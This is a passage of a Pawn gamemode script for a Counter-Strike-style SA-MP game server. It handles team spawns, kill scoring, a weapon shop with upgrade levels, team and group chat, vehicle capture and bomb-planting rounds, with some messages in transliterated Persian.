 else if(MapChange == 1)
 {
    
	if(gteam[playerid] == 2)
	{
	     new rand = random(sizeof(Rszb));
	     SetPlayerPos(playerid,Rszb[rand][0], Rszb[rand][1],Rszb[rand][2]);
	     SetPlayerFacingAngle(playerid,Rszb[rand][3]);
		SetPlayerHealth(playerid,500);
		GivePlayerWeaponEx(playerid,9,1);
		GameTextForPlayer(playerid,"~r~Zombie",2500,1);
		SetPlayerColor(playerid,COLOR_RED);
	}
	else if(gteam[playerid] == 1)
	{
	    new rand = random(sizeof(Rszh));
	     SetPlayerPos(playerid,Rszh[rand][0], Rszh[rand][1],Rszh[rand][2]);
	     SetPlayerFacingAngle(playerid,Rszh[rand][3]);
	    SetPlayerHealth(playerid,100);
		GivePlayerWeaponEx(playerid,31,1000);
		GivePlayerWeaponEx(playerid,30,1000);
		GivePlayerWeaponEx(playerid,29,1000);
	GameTextForPlayer(playerid,"~b~Human",2500,1);
		SetPlayerColor(playerid,COLOR_WHITE);
	}
 } else if(MapChange == 2)
 {
        SetPlayerHealth(playerid,100);
        GivePlayerWeaponEx(playerid,34,5000);
        GameTextForPlayer(playerid,"~g~Sniper",2500,1);
    if(gteam[playerid] == 2){
	    new rand = random(sizeof(Rss2));
	     SetPlayerPos(playerid,Rss2[rand][0], Rss2[rand][1],Rss2[rand][2]);
	     SetPlayerFacingAngle(playerid,Rss2[rand][3]);
		 }
	    else {new rand = random(sizeof(Rss1));
	     SetPlayerPos(playerid,Rss1[rand][0], Rss1[rand][1],Rss1[rand][2]);
	     SetPlayerFacingAngle(playerid,Rss1[rand][3]);}
		
 }
 else if(MapChange == 3)
 {
    GangZoneShowForPlayer(playerid,gzones[1],COLOR_BLUE);
    GangZoneShowForPlayer(playerid,gzones[2],COLOR_RED);
    if(gteam[playerid] == 2)
	{
    new rand = random(sizeof(Rsin));
	     SetPlayerPos(playerid,Rsin[rand][0], Rsin[rand][1],Rsin[rand][2]);
	     SetPlayerFacingAngle(playerid,Rsin[rand][3]);
	     SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 18);
	}
	else if(gteam[playerid] == 1)
	{
    new rand = random(sizeof(Rsin));
	     SetPlayerPos(playerid,Rsin[rand][0], Rsin[rand][1],Rsin[rand][2]);
	     SetPlayerFacingAngle(playerid,Rsin[rand][3]);
	     SetPlayerVirtualWorld(playerid, 1);
			SetPlayerInterior(playerid, 18);
	}
 }
 else if(MapChange == 4)
 {
    if(gteam[playerid] == 2)
	{

    new rand = random(sizeof(Rsp2));
	     SetPlayerPos(playerid,Rsp2[rand][0], Rsp2[rand][1],Rsp2[rand][2]);
	     SetPlayerFacingAngle(playerid,Rsp2[rand][3]);
	     SetPlayerVirtualWorld(playerid, 0);
	     	GivePlayerWeaponEx(playerid,32,1000);
	GivePlayerWeaponEx(playerid,33,1000);
	GivePlayerWeaponEx(playerid,25,1000);
	GivePlayerWeaponEx(playerid,30,1000);
	     
	}
	else if(gteam[playerid] == 1)
	{
	
    new rand = random(sizeof(Rsp1));
	     SetPlayerPos(playerid,Rsp1[rand][0], Rsp1[rand][1],Rsp1[rand][2]);
	     SetPlayerFacingAngle(playerid,Rsp1[rand][3]);
	     SetPlayerVirtualWorld(playerid, 0);
	     GivePlayerWeaponEx(playerid,32,1000);
	GivePlayerWeaponEx(playerid,33,1000);
	GivePlayerWeaponEx(playerid,25,1000);
	GivePlayerWeaponEx(playerid,30,1000);

	}
	}
	 else if(MapChange == 5)
 {
    bedamjetpack[playerid] = true;
	JetPack[playerid] = 1;
    if(gteam[playerid] == 2)
	{
	
	
    new rand = random(sizeof(Rsmp5));
	     SetPlayerPos(playerid,Rsmp5[rand][0], Rsmp5[rand][1],Rsmp5[rand][2]);
	     SetPlayerFacingAngle(playerid,Rsmp5[rand][3]);
	     SetPlayerVirtualWorld(playerid, 0);
	      SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
	GivePlayerWeaponEx(playerid,32,1000);
	 SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
	}
	else if(gteam[playerid] == 1)
	{
	
	
	
    new rand = random(sizeof(Rs2mp5));
	     SetPlayerPos(playerid,Rs2mp5[rand][0], Rs2mp5[rand][1],Rs2mp5[rand][2]);
	     SetPlayerFacingAngle(playerid,Rs2mp5[rand][3]);
	     SetPlayerVirtualWorld(playerid, 0);
	     SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
	     GivePlayerWeaponEx(playerid,32,1000);
	      SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
	}
 }

 if (MapChange == 5) bebakhashkhodamano();
 SpectateOff(playerid);
	return 1;
}

forward RemoveTextDraw(playerid);
public RemoveTextDraw(playerid)
{
   TextDrawHideForPlayer(playerid, KillerTextdraw[playerid]);
   TextDrawHideForPlayer(playerid, KillerTextdraw1[playerid]);
   TextDrawHideForPlayer(playerid, KillerTextdraw2[playerid]);
   return 1;
}
public OnPlayerDeath(playerid, killerid, reason)
{
if(cp[playerid] == 1 && prt[playerid] == 1)
{
cp[playerid] = 0;
prt[playerid] = 0;
DisablePlayerCheckpoint(playerid);
new vehid; vehid = GetPlayerVehicleID(playerid);
SetVehicleToRespawn(vehid);
}
isplayerspawn[playerid]= false;
if(FirstPerson[playerid] == 1)
{
    StopFPS(playerid);
}
SetPlayerScore(killerid,GetPlayerScore(killerid)+2);
SetPlayerScore(playerid,GetPlayerScore(playerid)-1);
if(killerid != INVALID_PLAYER_ID) SendDeathMessage(killerid, playerid, reason);
    PlayerInfo[killerid][pKills]++;
    PlayerInfo[playerid][pDeaths]++;
    PlayerInfo[killerid][pCash]+=20000;
     PlayerInfo[killerid][pScore] += 2;
     PlayerInfo[playerid][pScore]--;
   GivePlayerMoneyEx(killerid,20000);
 SendClientMessage(playerid,-1,"Shoma Mordi. {cfed0b}[-1 Score]");
 if(MapChange != 4){
 SpectateOn(playerid);
 }
  TextDrawShowForPlayer(killerid, KillerTextdraw[killerid]);
    TextDrawShowForPlayer(killerid, KillerTextdraw1[killerid]);
    TextDrawShowForPlayer(killerid, KillerTextdraw2[killerid]);
   SetTimerEx("RemoveTextDraw", 3000, false,"i", killerid);
   if(MapChange != 4)  roundend();
  PlayerInfo[killerid][pDrugs]+= 2;
    DropPlayerWeapons(playerid);
    return 1;
}
public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
	if(playertextid == close[playerid])
	{
        for(new n; n <= 13; n++)
	{
		TextDrawHideForPlayer(playerid,Gunstxd[n]);
	}
	PlayerTextDrawHide(playerid,aktxd[playerid]);
	PlayerTextDrawHide(playerid,m4txd[playerid]);
	PlayerTextDrawHide(playerid,snipetxd[playerid]);
	PlayerTextDrawHide(playerid,mp5txd[playerid]);
	PlayerTextDrawHide(playerid,sgtxd[playerid]);
	PlayerTextDrawHide(playerid,sawntxd[playerid]);
	PlayerTextDrawHide(playerid,close[playerid]);
 	PlayerTextDrawHide(playerid,buytxd[playerid]);
	if(PlayerInfo[playerid][pAk] > 0) PlayerTextDrawHide(playerid,aklevel[playerid]);
	if(PlayerInfo[playerid][pM4] > 0) PlayerTextDrawHide(playerid,m4level[playerid]);
	if(PlayerInfo[playerid][pSnipe] > 0) PlayerTextDrawHide(playerid,snipelevel[playerid]);
	if(PlayerInfo[playerid][pMp5] > 0) PlayerTextDrawHide(playerid,mp5level[playerid]);
	if(PlayerInfo[playerid][pShotgun] > 0) PlayerTextDrawHide(playerid,shotgunlevel[playerid]);
	if(PlayerInfo[playerid][pSawn] > 0) PlayerTextDrawHide(playerid,sawnlevel[playerid]);
	}
	if(playertextid == aktxd[playerid])
	{
		if(PlayerInfo[playerid][pAk] < 1)
		{
		    Upgrade[playerid] = false;
			IsGunSelection[playerid] = 1;
			PlayerTextDrawSetString(playerid,buytxd[playerid],"Buy");
			PlayerTextDrawShow(playerid,buytxd[playerid]);
		}
	 	else 
		{
		    Upgrade[playerid] = true;
		    IsGunSelection[playerid] = 1;
            GivePlayerWeaponEx(playerid,30,1000);
            PlayerTextDrawSetString(playerid,buytxd[playerid],"Upgrade");
			PlayerTextDrawShow(playerid,buytxd[playerid]);
		}
	}
	if(playertextid == m4txd[playerid])
	{
	if(PlayerInfo[playerid][pM4] < 1)
		{
		    Upgrade[playerid] = false;
			IsGunSelection[playerid] = 2;
			PlayerTextDrawSetString(playerid,buytxd[playerid],"Buy");
			PlayerTextDrawShow(playerid,buytxd[playerid]);
		}
	 	else
		{
		    Upgrade[playerid] = true;
		    IsGunSelection[playerid] = 2;
            GivePlayerWeaponEx(playerid,31,1000);
            PlayerTextDrawSetString(playerid,buytxd[playerid],"Upgrade");
			PlayerTextDrawShow(playerid,buytxd[playerid]);
		}
	}
		if(playertextid == snipetxd[playerid])
	{
	if(PlayerInfo[playerid][pSnipe] < 1)
		{
		    Upgrade[playerid] = false;
			IsGunSelection[playerid] = 3;
			PlayerTextDrawSetString(playerid,buytxd[playerid],"Buy");
			PlayerTextDrawShow(playerid,buytxd[playerid]);
		}
	 	else
		{
		    Upgrade[playerid] = true;
		    IsGunSelection[playerid] = 3;
            GivePlayerWeaponEx(playerid,33,1000);
            PlayerTextDrawSetString(playerid,buytxd[playerid],"Upgrade");
			PlayerTextDrawShow(playerid,buytxd[playerid]);
		}
		}
			if(playertextid == mp5txd[playerid])
	{
	if(PlayerInfo[playerid][pMp5] < 1)
		{
		    Upgrade[playerid] = false;
			IsGunSelection[playerid] = 4;
			PlayerTextDrawSetString(playerid,buytxd[playerid],"Buy");
			PlayerTextDrawShow(playerid,buytxd[playerid]);
		}
	 	else
		{
		    Upgrade[playerid] = true;
		    IsGunSelection[playerid] = 4;
            GivePlayerWeaponEx(playerid,29,1000);
            PlayerTextDrawSetString(playerid,buytxd[playerid],"Upgrade");
			PlayerTextDrawShow(playerid,buytxd[playerid]);
		}
	}
		if(playertextid == sgtxd[playerid])
	{
		if(PlayerInfo[playerid][pShotgun] < 1)
		{
		    Upgrade[playerid] = false;
			IsGunSelection[playerid] = 5;
			PlayerTextDrawSetString(playerid,buytxd[playerid],"Buy");
			PlayerTextDrawShow(playerid,buytxd[playerid]);
		}
	 	else
		{
		    Upgrade[playerid] = true;
		    IsGunSelection[playerid] = 5;
            GivePlayerWeaponEx(playerid,25,1000);
            PlayerTextDrawSetString(playerid,buytxd[playerid],"Upgrade");
			PlayerTextDrawShow(playerid,buytxd[playerid]);
		}
	}
	if(playertextid == sawntxd[playerid])
	{
		if(PlayerInfo[playerid][pShotgun] < 1)
		{
		    Upgrade[playerid] = false;
			IsGunSelection[playerid] = 6;
			PlayerTextDrawSetString(playerid,buytxd[playerid],"Buy");
			PlayerTextDrawShow(playerid,buytxd[playerid]);
		}
	 	else
		{
		    Upgrade[playerid] = true;
		    IsGunSelection[playerid] = 6;
            GivePlayerWeaponEx(playerid,26,1000);
            PlayerTextDrawSetString(playerid,buytxd[playerid],"Upgrade");
			PlayerTextDrawShow(playerid,buytxd[playerid]);
		}
	}
	if(playertextid == buytxd[playerid])
	{
		new guninfo[256];
		if(Upgrade[playerid] == true)
		{
			if(IsGunSelection[playerid] == 1)
			{
				if(PlayerInfo[playerid][pAk] == 1)
				{
				    if(GetPlayerMoney(playerid) <= 300000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $300.000 Cash", "OK", "");
					format(guninfo,sizeof(guninfo),"Upgrade Ak-47 To Level 2? Price: $300.000");
					ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Upgrade", guninfo, "OK", "Cancel");
				}
				if(PlayerInfo[playerid][pAk] == 2)
				{
				    if(GetPlayerMoney(playerid) <= 400000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $400.000 Cash", "OK", "");
					format(guninfo,sizeof(guninfo),"Upgrade Ak-47 To Level 3? Price: $400.000");
					ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Upgrade", guninfo, "OK", "Cancel");
				}
				if(PlayerInfo[playerid][pAk] == 3)
				{
				    if(GetPlayerMoney(playerid) <= 500000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $500.000 Cash", "OK", "");
					format(guninfo,sizeof(guninfo),"Upgrade Ak-47 To Level 4[Maximum level]? Price: $500.000");
					ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Upgrade", guninfo, "OK", "Cancel");
				}

			}
			if(IsGunSelection[playerid] == 2)
			{
				if(PlayerInfo[playerid][pM4] == 1)
				{
				    if(GetPlayerMoney(playerid) <= 600000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $300.000 Cash", "OK", "");
					format(guninfo,sizeof(guninfo),"Upgrade M4 To Level 2? Price: $600.000");
					ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Upgrade", guninfo, "OK", "Cancel");
				}
				if(PlayerInfo[playerid][pM4] == 2)
				{
				    if(GetPlayerMoney(playerid) <= 800000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $400.000 Cash", "OK", "");
					format(guninfo,sizeof(guninfo),"Upgrade M4 To Level 3? Price: $800.000");
					ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Upgrade", guninfo, "OK", "Cancel");
				}
				if(PlayerInfo[playerid][pM4] == 3)
				{
				    if(GetPlayerMoney(playerid) <= 1000000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $1.000.000 Cash", "OK", "");
					format(guninfo,sizeof(guninfo),"Upgrade M4 To Level 4[Maximum level]? Price: $1000.000");
					ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Upgrade", guninfo, "OK", "Cancel");
				}

			}
			if(IsGunSelection[playerid] == 3)
			{
				if(PlayerInfo[playerid][pSnipe] == 1)
				{
				    if(GetPlayerMoney(playerid) <= 2000000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $2.000.000 Cash", "OK", "");
					format(guninfo,sizeof(guninfo),"Upgrade Rifle To Level 2[Maximum level]? Price: $2000.000");
					ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Upgrade", guninfo, "OK", "Cancel");
				}
			}
			if(IsGunSelection[playerid] == 4)
			{
				if(PlayerInfo[playerid][pMp5] == 1)
				{
				    if(GetPlayerMoney(playerid) <= 800000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $800.000 Cash", "OK", "");
					format(guninfo,sizeof(guninfo),"Upgrade Mp5 To Level 2? Price: $800.000");
					ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Upgrade", guninfo, "OK", "Cancel");
				}
				if(PlayerInfo[playerid][pMp5] == 2)
				{
				    if(GetPlayerMoney(playerid) <= 1200000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $1.200.000 Cash", "OK", "");
					format(guninfo,sizeof(guninfo),"Upgrade Mp5 To Level 3[Maximum level]? Price: $1.200.000");
					ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Upgrade", guninfo, "OK", "Cancel");
				}
			}
			if(IsGunSelection[playerid] == 5)
			{
				if(PlayerInfo[playerid][pShotgun] == 1)
				{
				    if(GetPlayerMoney(playerid) <= 5000000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $5.000.000 Cash", "OK", "");
					format(guninfo,sizeof(guninfo),"Upgrade Shotgun To Level 2[Maximum level]? Price: $5.000.000");
					ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Upgrade", guninfo, "OK", "Cancel");
				}
			}
					if(IsGunSelection[playerid] == 6)
			{
				if(PlayerInfo[playerid][pSawn] == 1)
				{
				    if(GetPlayerMoney(playerid) <= 5500000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $5.500.000 Cash", "OK", "");
					format(guninfo,sizeof(guninfo),"Upgrade Shotgun To Level 2[Maximum level]? Price: $5.500.000");
					ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Upgrade", guninfo, "OK", "Cancel");
				}
			}
		}
		else
		{
			if(IsGunSelection[playerid] == 1)
			{
			    if(GetPlayerMoney(playerid) <= 200000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $200.000 Cash", "OK", "");
                format(guninfo,sizeof(guninfo),"Buy Ak-47? Price: $200.000");
				ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Buy", guninfo, "Buy", "Cancel");
			}
			if(IsGunSelection[playerid] == 2)
			{
			    if(GetPlayerMoney(playerid) <= 600000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $600.000 Cash", "OK", "");
                format(guninfo,sizeof(guninfo),"Buy M4? Price: $600.000");
				ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Buy", guninfo, "Buy", "Cancel");
			}
			if(IsGunSelection[playerid] == 3)
			{
			    if(GetPlayerMoney(playerid) <= 1500000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $1.500.000 Cash", "OK", "");
                format(guninfo,sizeof(guninfo),"Buy Rifle? Price: $1.500.000");
				ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Buy", guninfo, "Buy", "Cancel");
			}
			if(IsGunSelection[playerid] == 4)
			{
			    if(GetPlayerMoney(playerid) <= 500000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $500.000 Cash", "OK", "");
                format(guninfo,sizeof(guninfo),"Buy Mp5? Price: $500.000");
				ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Buy", guninfo, "Buy", "Cancel");
			}
			if(IsGunSelection[playerid] == 5)
			{
			    if(GetPlayerMoney(playerid) <= 2000000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $2.000.000 Cash", "OK", "");
                format(guninfo,sizeof(guninfo),"Buy Shotgun? Price: $2.000.000");
				ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Buy", guninfo, "Buy", "Cancel");
			}
			if(IsGunSelection[playerid] == 6)
			{
			    if(GetPlayerMoney(playerid) <= 3000000) return ShowPlayerDialog(playerid, 2048, DIALOG_STYLE_MSGBOX, "Error", "You Need $3.000.000 Cash", "OK", "");
                format(guninfo,sizeof(guninfo),"Buy Sawn off shotgun? Price: $3.000.000");
				ShowPlayerDialog(playerid, DIALOG_GUNS, DIALOG_STYLE_MSGBOX, "Buy", guninfo, "Buy", "Cancel");
			}
		}
	}
    return 1;
}

public OnVehicleSpawn(vehicleid)
{
	return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
	
	if(vehicleid == g_Vehicle[4] || vehicleid == g_Vehicle[5]){
	new vd = WhoIsDriver(vehicleid);
	if(IsPlayerInAnyVehicle(vd))
	{
		cp[vd] = 0;
		prt[vd] = 0;
		DisablePlayerCheckpoint(vd);
		SetVehicleToRespawn(vehicleid);
	}
	}
	return 1;
}

public OnPlayerText(playerid, text[])
{
//work
if(PlayerInfo[playerid][pLog] == 0) return SCM(playerid,-1,"First Login The Server");
if(muted[playerid] == true) {SendClientMessage(playerid,-1,"You Are Muted"); return 0;}
     PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
      if(text[0] == '@')
		{
		new msg[512], pname[MAX_PLAYER_NAME];
         GetPlayerName(playerid, pname, MAX_PLAYER_NAME);
         format(msg, sizeof(msg), "{abc611}[RADIO]{ffffff} %s (ID %d):{4763a3} %s", pname, playerid, text[1]);
         SendTeamMessage(msg,gteam[playerid]);
		 return 0;
		}
		 if(text[0] == '!')
   		{
   		new msg[512];
   		if(PlayerInfo[playerid][pClan] == 0){SCM(playerid,-1,"Shoma Dar Hich Groupi Nistid"); return 0;}
   		format(msg, sizeof(msg), "{abc611}[Group] %s{ffffff} %s (ID %d):{e2d688} %s", GetGroupRank(playerid),GetName(playerid), playerid, text[1]);
   		SendGroupMessage(PlayerInfo[playerid][pClan],msg);
            return 0;
   		}
         new msg[1024], pname[MAX_PLAYER_NAME];
         GetPlayerName(playerid, pname, MAX_PLAYER_NAME);
          format(msg, sizeof(msg), "%s{B8860B} %s{daedea} %s{c1e2ac} %s{FFFF00} (%d):{ffffff} %s",GetRank(playerid),GetTeam(playerid),GetClanTag(playerid), pname, playerid, text);
         SendClientMessageToAll(1,msg);
SetPlayerChatBubble(playerid, text, 0xFF0000FF, 100.0, 10000);
	return 0;
}

public OnPlayerCommandText(playerid, cmdtext[])
{
 if(PlayerInfo[playerid][pLog] == 0) return SCM(playerid,-1,"First Login The Server");
 CommandCount[playerid]++;
	
	return 0;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
    if(gteam[playerid] == 1 && vehicleid == g_Vehicle[4] || gteam[playerid] == 2 && vehicleid == g_Vehicle[5])
    {
  		new Float:x,Float:y,Float:z;
  		GetPlayerPos(playerid,Float:x,Float:y,Float:z);
  		SetPlayerPos(playerid,Float:x,Float:y,Float:z);
	SetPlayerVirtualWorld(playerid,0);
	}
	else if(gteam[playerid] == 2 && vehicleid == g_Vehicle[4])
	{
		cp[playerid] = 1;
        SetPlayerCheckpoint(playerid, -2289.2673,966.0530,65.8015, 3.0);
        prt[playerid] = 1;
	    new msg[500];new player[128];
	    GetPlayerName(playerid,player,sizeof(player));
		format(msg,sizeof(msg),"{90ea69}[PROTOTYPE]{ffffff} Player {5e8df9}%s  {ffffff}Robbed{70ea72}Prototype{ffffff} Team 1(CT).",player);
        SendClientMessageToAll(-1,msg);
	}
	else if(gteam[playerid] == 1 && vehicleid == g_Vehicle[5])
	{
		cp[playerid] = 1;
        SetPlayerCheckpoint(playerid, -2289.2673,966.0530,65.8015, 3.0);
        prt[playerid] = 1;
	    new msg[500];new player[128];
	    GetPlayerName(playerid,player,sizeof(player));
		format(msg,sizeof(msg),"{90ea69}[PROTOTYPE]{ffffff} Player {5e8df9}%s  {ffffff}Robbed{70ea72}Prototype{ffffff} Team 2(T).",player);
        SendClientMessageToAll(-1,msg);
        
	}
else if(vehicleid == g_Vehicle[0])
{
	if(playerid != ponykey)
	{
 new Float:cx, Float:cy, Float:cz;
			GetPlayerPos(playerid, cx, cy, cz);
			SetPlayerPos(playerid, cx,  cy, cz);
  SendClientMessage(playerid,-1,"You Need {f75707}Pony{ffffff} Key!");
 
	}
	}
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
if(vehicleid == g_Vehicle[5] ||  vehicleid == g_Vehicle[4])
{
cp[playerid] = 0;
prt[playerid] = 0;
DisablePlayerCheckpoint(playerid);
new vehid; vehid = GetPlayerVehicleID(playerid);
SetVehicleToRespawn(vehid);
}
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{


	return 1;
}
public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ) {
    if(hittype != BULLET_HIT_TYPE_NONE) {
        if((fX <= -1000.0 || fX >= 1000.0) || (fY <= -1000.0 || fY >= 1000.0) || (fZ <= -1000.0 || fZ >= 1000.0) || (hittype < 0 || hittype > 4)) {
		SCM(playerid,-1,"Crasher? :D");
            return Kick(playerid);
        }
        }
    return 1;
}
public OnPlayerEnterCheckpoint(playerid)
{
	new vehid;
	vehid = GetPlayerVehicleID(playerid);
	if(cp[playerid] == 1 && gteam[playerid] == 1 && vehid == g_Vehicle[5] && prt[playerid] == 1) 
	{
		DisablePlayerCheckpoint(playerid); 
		cp[playerid] = 0; 
		new msg[500];new player[128];
	    GetPlayerName(playerid,player,sizeof(player));
		format(msg,sizeof(msg),"{90ea69}[PROTOTYPE]{ffffff} Player {5e8df9}%s  {70ea72}Prototype{ffffff} Team 1(CT) Ra Be Maghsad Resand.",player);
        SendClientMessageToAll(-1,msg);
       	format(msg,sizeof(msg),"~R~[PROTOTYPE]~w~ Player ~b~%s  ~R~Prototype~w~ Team 2(T) Ra Be Maghsad Resand.",player);
        SendAmar(msg);
        prt[playerid] = 0;
        NewMapTimer(playerid);
        cp[playerid] = 0;
	    new vehid1; vehid1 = GetPlayerVehicleID(playerid);
		SetVehicleToRespawn(vehid1);
		return 1;
	}
	else if(cp[playerid] == 1 && gteam[playerid] == 2 && vehid == g_Vehicle[5]) 
	{
		DisablePlayerCheckpoint(playerid); 
		cp[playerid] = 0; 
		
		new msg[500];new player[128];
	    GetPlayerName(playerid,player,sizeof(player));
		format(msg,sizeof(msg),"{90ea69}[PROTOTYPE]{ffffff} Player {5e8df9}%s  {70ea72}Prototype{ffffff} Team 1(CT) Ra Be Maghsad Resand.",player);
        SendClientMessageToAll(-1,msg);
       	format(msg,sizeof(msg),"~R~[PROTOTYPE]~w~ Player ~b~%s  ~R~Prototype~w~ Team 1(CT) Ra Be Maghsad Resand.",player);
        SendAmar(msg);
        prt[playerid] = 0;
        NewMapTimer(playerid);
   	    new vehid2; vehid2 = GetPlayerVehicleID(playerid);
		SetVehicleToRespawn(vehid2);

		return 1;
	}
	return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
	return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
	return 1;
}

public OnRconCommand(cmd[])
{
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
	return 1;
}

public OnObjectMoved(objectid)
{
	return 1;
}

public OnPlayerObjectMoved(playerid, objectid)
{
	return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{
	return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
	return 1;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	return 1;
}

public OnPlayerSelectedMenuRow(playerid, row)
{
	return 1;
}

public OnPlayerExitedMenu(playerid)
{
	return 1;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	return 1;
}
forward mytimer();
public mytimer()
{
	roundend();
	KillTimer(BombTimer);
	SendAmar("~R~CS-BOT: ~b~Bomb ~r~Defuse");
	DestroyObject(BombPlaced);
	
	killall(2);
	soundall(3);
		roundend();
		
	return 1;
}
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
if(newkeys & KEY_WALK)
{
if(IsPlayerInRangeOfPoint(playerid, 5.0,424.3456,2536.6072,16.5270))
{
if(gteam[playerid] == 2)
{
SetPlayerVirtualWorld(playerid, 0);
SetPlayerInterior(playerid, 18);
SetPlayerPos(playerid, 1710.433715,-1669.379272,20.225049);
}
}
if(IsPlayerInRangeOfPoint(playerid, 5.0,-1470.7657,2615.3225,59.2334))
{
if(gteam[playerid] == 1)
{
SetPlayerVirtualWorld(playerid, 1);
SetPlayerInterior(playerid, 18);
SetPlayerPos(playerid, 1710.433715,-1669.379272,20.225049);
}
}
if(IsPlayerInRangeOfPoint(playerid, 5.0,1701.5691,-1667.9170,20.2188))
{
if(gteam[playerid] == 1) {SetPlayerPos(playerid,-1470.7657,2615.3225,59.2334); SetPlayerVirtualWorld(playerid, 0); SetPlayerInterior(playerid, 0);}
if(gteam[playerid] == 2) {SetPlayerPos(playerid,424.3456,2536.6072,16.5270); SetPlayerVirtualWorld(playerid, 0); SetPlayerInterior(playerid, 0);}
}


if(newkeys == KEY_SUBMISSION && isplayerspawn[playerid] == false)//Button 2
        {
            SpectateNext(playerid);
        }
        if(newkeys == KEY_SUBMISSION && IsPlayerSpectating[playerid])//Button 2
        {
            SpectateOff(playerid);
        }
        if(newkeys == KEY_ANALOG_RIGHT && IsPlayerSpectating[playerid])//Num4
        {
            SpectatePrevious(playerid);
        }
        if(newkeys == KEY_ANALOG_LEFT && IsPlayerSpectating[playerid])//Num6
        {
            SpectateNext(playerid);
        }
        new Float:x,Float:y,Float:z;
GetPlayerVelocity(playerid, x, y, z); 
SetPlayerVelocity(playerid,x * 2, y *2, z * 2); 
}
if(newkeys & KEY_WALK){
	new Float:x,Float:y,Float:z;
if(gteam[playerid] == 2)
	{
 if (BombPlanted != 1)
{
if(IsPlayerInRangeOfPoint(playerid, 5.0,-1151.0432,2401.4204,146.7129)){
				if(pbomb[playerid] == 1){
    			GetPlayerPos(playerid,x,y,z);
    			BombPlaced = CreateObject(1252, x,y,z,0,0,0);
    			pbomb[playerid] = 0;
    			BombPlanted = 1;
    			BombTimer = SetTimerEx("bombblow", 40000, false, "i", playerid);
    			ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 2000);
	   			soundall(1);
	   				SendClientMessageToAll(COLOR_BLUE, "{33CCFF}CS-BOT: {AA3333}Bomb {FFFF00}Blow");
	   			}
    			}
    			else if(IsPlayerInRangeOfPoint(playerid, 5.0,-967.5349,2363.2842,138.5429))
				{
                	if(pbomb[playerid] == 1){
    			GetPlayerPos(playerid,x,y,z);
    		BombPlaced = CreateObject(1252, x,y,z,0,0,0);
    			pbomb[playerid] = 0;
    			BombPlanted = 1;
    			BombTimer = SetTimerEx("bombblow", 40000, false, "i", playerid);
    			ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 2000);
    			soundall(1);
